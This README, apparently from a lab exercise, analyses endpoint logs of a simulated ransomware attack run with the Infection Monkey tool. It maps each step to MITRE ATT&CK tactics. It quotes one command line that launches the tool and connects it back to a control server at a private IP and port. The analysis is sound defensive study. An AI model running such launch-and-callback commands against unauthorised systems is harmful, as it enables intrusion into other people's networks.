# Step-by-step of the Ransomware Attack
In this README.md, the 82 logs that were associated with the ransomware attack will be analysed. Only the logs that were crucial to the functioning, persistence or execution of the ransomware attack will be analysed. Other logs that were deemed not as important will be filtered out of this analysis, such as the creation of the *api-ms-win-crt-locale-l1-1-0.dll* file.

## Step 1: Establish connection back to the server
<img width="1296" height="547" alt="f8ba21b36ebd2f7dae14ca29303a510d" src="https://github.com/user-attachments/assets/4e9fc532-4dd7-4ec0-89f7-585e259d9b9c" />

The most important part of this log is what was entered into the commandline as a parameter to launch the Infection Monkey.exe. The `C:\Users\micha\AppData\Roaming\monkey_island\monkey-windows-64.exe m0nk3y -s 192.168.20.10:5000` line establishes a connection back
to a server, presumably one that collects telemetry, system information, the session, or manages retrieved data.

## Step 2: Establish Persistence and Malicious Tooling in Endpoint
### Exhibit A
<img width="1372" height="666" alt="51440f523f5779503963559f5e04bb77" src="https://github.com/user-attachments/assets/4180e2c3-f820-4a32-b177-bb17fe920e88" />
Approximately ~50 DLLs were created in a temp file on the host machine. Presumably this is to participate in Resource Development (TA0042, Mitre ATT&CK Framework) to establish a set of tools that are necessary for the ransomware attack. For example, python3.dll and sqlite3.dll were installed into the temp folder, suggesting potential remote code execution or data exfiltration. On the Mitre ATT&CK Framework, these resources can facilitate Execution (TA0002) and Persistence (TA0003). It is possible that the attacker is preparing an environment for Lateral Movement (TA0008) through the endpoint or to infiltrate other devices in the network. 

### Exhibit B
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/86ab2660-c657-4ac3-bee6-4ea3856348f4" />
Instances of the Infection Monkey process are being cloned with the `multiprocessing-fork` argument. This allows the attacker to run multiple instances of the Infection Monkey process simultaneously,
and leverages multiple CPU cores. It is possible the attacker did this to increase the rate at which target files are being encrypted. It could also be a way to establish more than 1 connection
with a server via multiple processes. This way if one process is lost, another process can still be open for the server to connect to so the exploit can still occur.

## Step 3: Checking Firewall settings
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/feec1fdd-e16a-4fd2-ac5c-8cc93e33a9e0" />
This allows the malicious actor to check inbound/outbound rules, whether the Firewall is enabled or disabled, and logging settings of potential connections to the network. This information
gives scope to what can be exploited on the endpoint.

